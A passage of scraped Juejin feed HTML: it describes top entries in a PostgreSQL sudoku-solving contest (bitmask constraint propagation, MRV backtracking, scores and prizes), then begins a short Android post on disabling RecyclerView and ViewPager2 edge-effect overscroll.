<li>选格：计算所有空格的 “禁止数字掩码”（行 + 列 + 宫约束的并集），优先选禁止数字最多的格子（减少搜索分支）；</li>
<li>填数：遍历 1-9，仅筛选掩码允许的合法数字；</li>
<li>递归：通过位运算快速更新掩码状态，递归填充下一格；无解时自动回溯（无合法数字则分支断裂），填满 81 格即终止。</li>
</ul>
<h5 data-id="heading-7">4. 结果输出：格式化与多解处理</h5>
<p>筛选出填满 81 格的解，用行号处理多解情况，再将 81 字符的字符串格式化为 9×9 的网格形式，直观输出数独结果。</p>
<h2 data-id="heading-8">第6名：张泽鹏</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a1a63f4d8817469680b5c57cc88e6ac8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmluZURhdGE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768987212&amp;x-signature=Lx9nW8Lz2jdp4v6Ap2oKt1aq7SY%3D" alt="图片" loading="lazy"/></p>
<p><strong>参赛选手</strong>：张泽鹏</p>
<p><strong>个人简介</strong>：杭州隐函科技有限公司联创，技术负责人</p>
<p><strong>参赛数据库</strong>：PostgreSQL</p>
<p><strong>性能评测</strong>：1 万级数据代码性能评测 16.061秒</p>
<p><strong>综合得分</strong>：81.5</p>
<p>以下是张泽鹏选手的代码说明思路简介：</p>
<p>数独是典型的约束满足问题（Constraint satisfaction problem，CSPs），因此我采用了启发式的深度优先搜索算法来求解。</p>
<p>代码的核心推理逻辑是约束传播（Constraint Propagation），9x9的数独包含81个格子，所以我定义了 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>81</mn><mo>×</mo><mn>9</mn><mo>=</mo><mn>729</mn></mrow><annotation encoding="application/x-tex">81 \times 9 = 729</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">81</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">9</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">729</span></span></span></span></span> 位的 Bit String 作为『约束特征向量』。假设第一个格子那填了<code>2</code>，约束就传播至同行、同列、同宫的20个格子，即特征向量中第11位（第二个格子数字<code>2</code>）、第20位（第三个格子数字<code>2</code>）等20个特征位都会被标记为<code>1</code>。利用约束特征向量，数独中所有已填的数字可以快速传播至所有未填的格子，然后通过位运算“非”（<code>bitnot</code>）操作，可快速获得所有未填格子的可填候选值。</p>
<p>代码还借鉴了 DLX 算法的约束特征向量思想，把前文长729的『约束特征向量』按格子拆分成81个长36的『候选特征向量』，并且只保留未填（即值是<code>?</code>）的格子；为了减少空间使用量，特征向量不拘泥于严格的精确一次（Exactly Once）语义，而是保留了所有候选值都压缩在一个向量内的方式。例如 <code>b'010010000010000000000010000010000000'</code>，由以下四部分组成：</p>
<p>    1. 第01-09位【<code>b'010010000'</code>】：所有可填的候选值，来自上一步约束传播运算结果。若当前格子能填数字<code>N</code>（1-9），则第<code>N</code>位为<code>1</code>否则为<code>0</code>。本例中第二位和第五位为<code>1</code>，即当前格子能填<code>2</code>或<code>5</code>。</p>
<p>    2. 第10-18位【<code>b'010000000'</code>】：行号。若当前格子属于第<code>N</code>（1-9）行，则第<code>N</code>位为<code>1</code>，其他位为<code>0</code>。本例中第二位是<code>1</code>，即当前格子在第2行。</p>
<p>    3. 第19-27位【<code>b'000010000'</code>】：列号。若当前格子属于第<code>N</code>（1-9）列，则第<code>N</code>位为<code>1</code>，其他位为<code>0</code>。本例中第五位是<code>1</code>，即当前格子在第5列。</p>
<p>    4. 第28-36位【<code>b'010000000'</code>】：宫号。若当前格子属于第<code>N</code>（1-9）宫，则第<code>N</code>位为<code>1</code>，其他位为<code>0</code>。本例中第二位是<code>1</code>，即当前各自在第2宫。</p>
<p>获得所有『候选特征向量』后，再按以下步骤执行广度优先搜索：</p>
<p>    1. 每个数独的候选特征向量按候选值数量排序。</p>
<p>    2. 取出候选值数量最少的候选特征向量。</p>
<p>    3. 为每个候选值创建一个搜索分支。    </p>
<p>    4. 把当前候选值追加到当前分支的解集内。</p>
<p>    5. 在剩余的特征向量中，剔除所有冲突的候选值。即把同行、同列、同宫中相同的候选值剔除。</p>
<p>    6. 若还有剩余的特征向量，并且所有向量的候选值数量都大于<code>0</code>，则重复第一步，直到结束。</p>
<p>因为每个数独问题都至少有一个解，并且在最终结果里每个问题只需要返回一个解即可，因此我在代码中使用 <code>distinct on (id)</code> 随机选择一个解。</p>
<p>因为搜索是按照剩余候选值的顺序执行，所以生成最终结果前，需要把结果集先按照格子顺序重新排序，然后按照 <code>?</code> 的顺序依次填充。这里我用了一个技巧：先把原始数独中 <code>?</code> 替换成 <code>%s</code>，作为 <code>format</code> 函数的模板；再使用 PostgreSQL 的 <code>variadic</code> 关键词把结果集数组展开成 <code>format</code> 函数的参数，就能快速生成结果了。</p>
<h2 data-id="heading-9">第5名：周仟荣</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81eae412bd5147b0809bea5ef74a37fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmluZURhdGE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768987212&amp;x-signature=QONCCJhkxtVGWgvTjoGgI3AQcjU%3D" alt="图片" loading="lazy"/></p>
<p><strong><strong>参赛选手</strong></strong>：周仟荣</p>
<p><strong>选手简介</strong>：数据分析师，来自东风日产数据服务有限公司</p>
<p><strong>参赛数据库</strong>：PostgreSQL</p>
<p><strong>性能评测</strong>：1 万级数据代码性能评测 15.933 秒</p>
<p><strong>综合得分</strong>：82.3</p>
<p>以下是周仟荣选手的代码说明思路简介：</p>
<ol>
<li>算法概括</li>
</ol>
<p>本算法采用 “分而治之” 的策略，结合了 确定性贪心推理 与 启发式深度优先回溯。 算法核心通过 PostgreSQL 的 递归公用表表达式实现，利用 位运算掩码 (Bitmask) 替代集合运算，并针对大规模数据处理场景，通过 内存压缩 (Smallint) 与 延迟物化 (Late Materialization) 极致压榨单核执行效率。</p>
<ol start="2">
<li>分段说明</li>
</ol>
<p>第一阶段：预处理与掩码初始化</p>
<p>健壮解析： 利用正则清洗和 translate 函数，将多种输入格式（如带空格、问号或点的字符串）统一标准化为长度 81 的 smallint 数组。使用 2字节内存 存储数字，显著降低了递归过程中的内存带宽压力。</p>
<p>位掩码聚合： 不使用逐行扫描，而是通过一次性全量聚合，将行、列、九宫格的约束直接转化为位向量。1 代表该数字已存在，0 代表可选。这使得后续冲突检测仅需一次 按位或 (OR) 运算即可完成。</p>
<p>第二阶段：确定性求解流 </p>
<p>贪心推理： 此 CTE 处理所有 “唯一候选数” 情况。算法会持续搜寻仅剩一个可选数字的空格并直接填充。由于该阶段不产生搜索分支，执行效率极高，能瞬间完成约 95% 的中低难度题目。</p>
<p>第三阶段：逻辑分流与回溯补刀</p>
<p>逻辑分流： 通过 ID 过滤，将已解完和未解完的题目分离。仅对未解完的难题进行排序去重（DISTINCT ON）。这种分流机制彻底消除了 10,000 行级别数据在全量排序时可能触发的 磁盘溢出 (Disk Spill) 风险。</p>
<p>solve_backtracking (启发式回溯)： 针对难题，采用 最小剩余值优先 (MRV) 策略。算法优先选择候选数最少的格子进行尝试，极大程度收缩了搜索树的深度与广度。</p>
<p>第四阶段：格式化输出</p>
<p>        延迟物化： 在整个解题循环中，代码仅携带 ID 和数字状态，完全剥离了冗长的原题字符串。仅在最后输出阶段才通过 ID 关联取回题面，最大限度优化了递归缓存（Work Table）的利用率。</p>
<ol start="3">
<li>技术亮点总结</li>
</ol>
<ul>
<li>空间效率：smallint 数组比 int 数组节省 50% 内存。</li>
<li>运算效率：位运算掩码使冲突检测耗时几乎降至 CPU 周期级。</li>
<li>架构稳健性：分流逻辑确保了在大规模数据量（1万行+）下，性能依然保持线性扩展，不因排序内存不足而大幅衰减。</li>
<li>FILTER、DISTINCT ON 等 PostgreSQL 特有语法的应用对性能有一定提升</li>
</ul>
<h2 data-id="heading-10">第4名****马尾蛟</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e1a389384e84793bd9ee949f28be5e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmluZURhdGE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768987212&amp;x-signature=G56EEjpnnIWe9hykRJtkQx1JkYo%3D" alt="图片" loading="lazy"/></p>
<p><strong>参赛选手</strong>：马尾蛟</p>
<p><strong>选手简介</strong>：就职于某大型国际物流公司，从事数据科学多年</p>
<p><strong>参赛数据库</strong>：PostgreSQL</p>
<p><strong>性能评测</strong>：1 万级数据代码性能评测 13.875 秒</p>
<p><strong>综合得分</strong>：83.4</p>
<p>以下是马尾蛟选手的代码说明思路简介：</p>
<ol>
<li>输入清洗  </li>
</ol>
<p>   使用 <code>translate(g.puzzle, E'\r\n\t ', '')</code> 去除原题内的换行/空格，<code>generate_series(0,80)</code> 展开 81 个格子，计算每个格子的行 <code>r</code>、列 <code>c</code>、宫 <code>b</code> 以及原始字符。</p>
<ol start="2">
<li>约束掩码  </li>
</ol>
<p>    行、列、宫分别聚合成 9 个 <code>bit(9)</code> 段：对每个已填数字调用 <code>set_bit</code>，最终得到 81bit 的串，其中每 9bit 表示某一行（或列/宫）中已经出现过的数字。这样每次只需 <code>substring(... for 9)::bit(9)::int</code> 就能得到该行/列/宫的占位情况。</p>
<ol start="3">
<li>候选格列表  </li>
</ol>
<p>   把所有 <code>?</code> 的位置按顺序收集到 <code>todo</code> 数组，递归过程中用 <code>array_remove</code> 删除已填位置。这保证候选数少的格子更“靠前”，减少回溯树的分支。</p>
<ol start="4">
<li>digits CTE  </li>
</ol>
<p>   预生成 1~9 的文本和值以及 <code>(1 &lt;&lt; (n-1))</code>，递归时无需重复计算。</p>
<ol start="5">
<li>递归搜索  </li>
</ol>
<p>   <code>solver</code> CTE 保存当前字符串、三类掩码和剩余 <code>todo</code>。每一层先 <code>unnest(todo)</code>，计算 <code>mask_int = row_mask | col_mask | box_mask</code>，用 <code>bit_count(((~mask_int) &amp; 511)::bit(9))</code> 统计可用数字个数，并选择候选数最少的格子（经典 MRV 策略），大幅剪枝。</p>
<ol start="6">
<li>状态更新  </li>
</ol>
<p>   对于满足 <code>(mask_int &amp; d.bit)=0</code> 的数字 <code>d</code>，使用 <code>overlay</code> 在字符串中写入，<code>set_bit</code> 更新对应行/列/宫掩码，再把该格从 <code>todo</code> 中剔除即可得到下一状态。</p>
<ol start="7">
<li>终止条件  </li>
</ol>
<p>   当 <code>array_length(todo, 1)</code> 为空时输出当前字符串，该字符即完整解。整个过程严格遵守“一条 SQL + 递归 CTE”的比赛限制，无需自定义函数。</p>
<ol start="8">
<li>性能/输出  </li>
</ol>
<p>   在比赛给定的 PG17（表 sudoku9_9）上，默认设置下 1000 条样本约 1.20~1.25 秒。SQL 最终返回 <code>(id, puzzle, result)</code> 三列，其中 puzzle/result 均为 81 位字符串，便于和原始题库对照。</p>
<h2 data-id="heading-11">第3名：郭其</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ccf2c6b7c664da0a8d7b9f5c949c8a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmluZURhdGE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768987212&amp;x-signature=O%2BKj6QQRtvJL6XC%2BUtV4WKPeFKU%3D" alt="图片" loading="lazy"/></p>
<p><strong>参赛选手</strong>：郭其</p>
<p><strong>选手简介</strong>：中国移动设计院网研中心，数据库技术专家负责人</p>
<p><strong>参赛数据库</strong>：PostgreSQL</p>
<p><strong>性能评测</strong>：1万级数据代码性能评测 11.732 秒</p>
<p><strong>综合得分</strong>：86.5</p>
<p>以下是郭其选手的代码说明思路简介：</p>
<p>基于 MRV 启发式的多级位掩码递归搜索</p>
<ol>
<li>核心数据结构：三维位掩码 (Triple Bitmasking)</li>
</ol>
<ul>
<li>舍弃了传统的字符串或数组处理，将数独状态映射为三个 <strong>81 位的位图 (bit(81))</strong>：<code>r_mask</code>（行）、<code>c_mask</code>（列）、<code>b_mask</code>（宫）。</li>
<li>空间压缩：每个格子的状态通过 <code>substring</code> 提取 9 位 bit，利用位或运算 <code>|</code> 瞬间计算出该格子的“禁手”（已填数字）。</li>
<li>计算加速：通过 <code>bit_count</code>（计算 1 的个数）快速评估格子的填充约束，这比循环遍历判断快了几个数量级。</li>
</ul>
<ol start="2">
<li>第一级：线性传播层 (Propagate - "预制菜")</li>
</ol>
<p>利用唯一余数定理 (Naked Single)启动搜索。</p>
<ul>
<li>逻辑：如果一个格子在行、列、宫的约束下，只剩下唯一的一个数字可选（<code>bit_count = 8</code>），则直接填充。</li>
<li>作用：在进入高开销的递归搜索前，尽可能地填充已知信息，极大地缩小了搜索树的规模。</li>
</ul>
<ol start="3">
<li>核心启发式策略：MRV (最小剩余值) + 频率热度</li>
</ol>
<p>在递归层，算法不再盲目选择格子，而是应用了 MRV 策略：</p>
<ul>
<li>格位选择：通过 <code>ORDER BY bit_count(...) DESC LIMIT 1</code> 永远选择“最难”的格子（即剩余可选数字最少的格子）进行填入。</li>
<li>热度增强：引入 <code>freq_weight</code>（周围区域的填充密度），在多个格子候选数相同时，优先处理“拥挤区域”，从而引发搜索空间的连锁坍塌。</li>
</ul>
<ol start="4">
<li>第二级：极速冲刺层 (Solver - "贪心分支")</li>
</ol>
<p>这是执行效率的保障。</p>
<ul>
<li>有限回溯：通过 <code>res.rank &lt;= 2</code> 限制分支因子。它只尝试每个格子的前两个最可能的候选数。</li>
<li>效果：3-4s左右的速度解决 99% 的数独题目，通过剪掉 90% 以上的深层无效分支来换取极高的执行速度。</li>
</ul>
<ol start="5">
<li>第三级：终极保险层 (Final Insurance - "暴力兜底")</li>
</ol>
<p>这是保证“全量不丢题”的核心。</p>
<ul>
<li>精准拦截：利用 <code>NOT EXISTS</code> 逻辑，仅让 <code>Solver</code> 层处理失败的 ID 进入此层。</li>
<li>无限制回溯：彻底移除 <code>rank</code> 限制，回归标准的深度优先搜索 (DFS)。</li>
<li>设计哲学：主逻辑负责“快”，保险层负责“稳”。即使主逻辑因为贪心策略导致漏题，保险层也会不计代价地死磕到底，确保 10,000 条数据 100% 产出。</li>
</ul>
<p> 6. 结果去重</p>
<ul>
<li>自动验证：通过 <code>WHERE bit_count(f_mask) = 81</code> 确保输出的必须是完整的解。</li>
</ul>
<p>该算法巧妙地解决了数据库递归 CTE 容易产生的“空间爆炸”问题。它像一个漏斗，让简单的题目在极短时间内流出，而将计算资源集中在极个别的复杂题目上，实现了性能与准确率（100%）的完美统一。</p>
<h2 data-id="heading-12"><strong>第2名</strong></h2>
<p><strong>程宁</strong>**<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9bfe0cc5dec14c049535390becdee687~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmluZURhdGE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768987212&amp;x-signature=T1gH8yeg6ea5fo0P1HwggnO6Cmg%3D" alt="图片" loading="lazy"/></p>
<p><strong>参赛选手</strong>：程宁</p>
<p><strong>个人简介</strong>：嘉兴市第二医院信息科，从事信息化工作多年</p>
<p><strong>参赛数据库</strong>：PostgreSQL</p>
<p><strong>性能评测</strong>：1 万级数据代码性能评测 11.606 秒</p>
<p><strong>综合得分</strong>：89.3</p>
<p>以下是程宁选手的代码说明思路简介：</p>
<p>【功能】</p>
<p>基于 SQL 递归 CTE 实现 9 宫格数独自动求解，支持处理含空格 / 换行、以？表示空单元格的输入数据。</p>
<p>【核心减枝策略】</p>
<p>本题核心在于如何有效减枝，降低计算量，核心策略有三：</p>
<ul>
<li>唯一数冲突算法：显性唯一数（单元格仅 1 个候选数）、隐形唯一数（行 / 列 / 宫格某数仅 1 个可填位置）不可能在同一单元格存在2个不同的数，利用此规则避免再次计算错题，实现减枝；</li>
<li>候选数MPV算法：优选候选数最少的单元格填充，是最常见且有效的算法；</li>
<li>贪心算法：基于本题存在大量多解的情况，在MPV基础上，仅尝试填充一个数，单路径实现99.7%的题目一次性出结果</li>
</ul>
<p>【输出】</p>
<p>输出数独 ID、原始谜题（格式化后）、求解结果（每 9 字符换行，符合数独展示格式），每个数独仅返回 1 个有效解。</p>
<h2 data-id="heading-13">第1名：郑凌云</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/64493e1d64b84d56a848bef0aabefade~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmluZURhdGE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768987212&amp;x-signature=4vHjivPjhxlEQPcZx%2BH7CxJulnU%3D" alt="图片" loading="lazy"/></p>
<p><strong>参赛选手</strong>：郑凌云</p>
<p><strong>个人简介</strong>：淘宝，从事推荐系统开发<strong>参赛数据库</strong>：PostgreSQL<strong>性能评测</strong>：1 万级数据代码性能评测 4.855 秒<strong>综合得分</strong>：97.5以下是郑凌云选手的代码说明思路简介：</p>
<p>创新点：通过一个非常巧妙的设计，基于数组模拟出一个栈结构，在递归CTE中实现回溯算法，极大降低搜索空间，尽最大可能避免行数爆炸。</p>
<p>通用性：4x4 数独和 9x9 数独的代码结构完全一致，仅一些常数项有分别对应值。</p>
<p>算法分为3个阶段：</p>
<ol>
<li>
<p>初始化阶段，生成init_t表，位编码方式，记录关键约束数据row_can/col_can/box_can，并生成待填数字的位置列表放在todo中。</p>
</li>
<li>
<p>推理阶段，生成infer_t表，把确定性能推理出来的所有位置都填好，降低后续搜索量。</p>
</li>
<li>
<p>搜索阶段，生成search_t表，针对位置上有多选的情况，通过深度优先搜索加回溯加MRV策略，高效完成检索。</p>
</li>
</ol>
<ul>
<li>正常SQL很难做深度优先搜索，在这个阶段我设计了一个很巧妙的栈结构，让SQL也可以进行深度优先搜索。这是本方案最有创造力的地方，极大降低了无效搜索量。</li>
<li>因为数独问题是NP问题，可能存在需要极大搜索深度的题，需要保护一下程序别被这种题拖垮，设计有最大搜索深度deep限制，超限不解。</li>
<li>当前设定的最大搜索深度deep=65000，样例数据其实只需459就够了。如果难度很高的题，可以上调该深度。 </li>
</ul>
<ol start="4">
<li>输出阶段，最终的result数据，其实是在前面推理阶段和搜索阶段已经逐步填入了，所以输出阶段直接输出即可。</li>
</ol>
<h2 data-id="heading-14">大赛奖品</h2>
<p>本次数据库编程大赛的奖项安排：一等奖(1人）、二等奖(2人）、三等奖(3人)、阳光普照纪念奖（50人）。</p>
<ul>
<li>
<p><strong>一等奖(1人）</strong> ：大疆无人机 DJI NEO 2 畅飞套装 1 组 + 奖杯</p>
</li>
<li>
<p><strong>二等奖(2人</strong>）：Fuzozo 芙崽AI情感陪伴机器人 1 个 + 奖杯</p>
</li>
<li>
<p><strong>三等奖(3人)</strong> ：华为蓝牙耳机 1 个 + 奖杯</p>
</li>
<li>
<p><strong>阳光普照纪念****奖（50人</strong>）：办公养生壶 1 个</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6505bace9bdc4517a26cbbf67fe3d8d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmluZURhdGE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768987212&amp;x-signature=83Akcyns9vF9t3VrFZdl1I%2Bauc8%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-15">《数据库编程大赛》下一次再聚！</h2>
<p>本次《数据库编程大赛》前50名完成普通挑战并通过正确性验证的选手，也是会获得一份精美礼品，感谢大家对本次大赛的关注和支持，我们下次再相聚！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android 关于RecycleView和ViewPager2去除边缘反馈]]></title>    <link>https://juejin.cn/post/7594854295758798891</link>    <guid>https://juejin.cn/post/7594854295758798891</guid>    <pubDate>2026-01-14T09:22:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594854295758798891" data-draft-id="7595043440519036934" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android 关于RecycleView和ViewPager2去除边缘反馈"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-14T09:22:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="没有了遇见"/> <meta itemprop="url" content="https://juejin.cn/user/1521379826212983"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android 关于RecycleView和ViewPager2去除边缘反馈
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1521379826212983/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    没有了遇见
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T09:22:32.000Z" title="Wed Jan 14 2026 09:22:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Android 5.0（API 21） 开始增加EdgeEffect 边缘反馈,设计用户和老板觉得非常的反智,强烈要求取消.记录一下方便后边找代码.</p>
<h2 data-id="heading-0">1:RecycleView 去除边缘反馈</h2>
<p>在xml中设置</p>
<p>android:overScrollMode="never"</p>
<p>android:scrollbars="none"</p>
<pre><code class="hljs language-ini" lang="ini">&lt;androidx.recyclerview.widget.RecyclerView
    android:<span class="hljs-attr">id</span>=<span class="hljs-string">"@+id/rv_content"</span>
    android:<span class="hljs-attr">layout_width</span>=<span class="hljs-string">"match_parent"</span>
    android:<span class="hljs-attr">layout_height</span>=<span class="hljs-string">"match_parent"</span>
    android:<span class="hljs-attr">overScrollMode</span>=<span class="hljs-string">"never"</span>
    android:<span class="hljs-attr">scrollbars</span>=<span class="hljs-string">"none"</span> /&gt;
</code></pre>
<h2 data-id="heading-1">2:ViewPager2 去掉边缘反馈</h2>
<p>ViewPager2 内部维护了一个RecycleView 所以还是去掉Rv的边缘反馈就好了</p>
<pre><code class="hljs language-ini" lang="ini">public void setViewPageNoEdgeEffect(ViewPager2 viewPager2) {
    View <span class="hljs-attr">childAt</span> = viewPager2.getChildAt(<span class="hljs-number">0</span>)<span class="hljs-comment">;</span>
    if (<span class="hljs-attr">childAt</span> == null) return<span class="hljs-comment">;</span>
    if (childAt instanceof RecyclerView) {
        childAt.setOverScrollMode(View.OVER_SCROLL_NEVER)<span class="hljs-comment">;</span>
    }
}
</code></pre>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// ViewPager2 禁止华东</span>
viewPager2.<span class="hljs-built_in">setUserInputEnabled</span>(<span class="hljs-literal">false</span>);
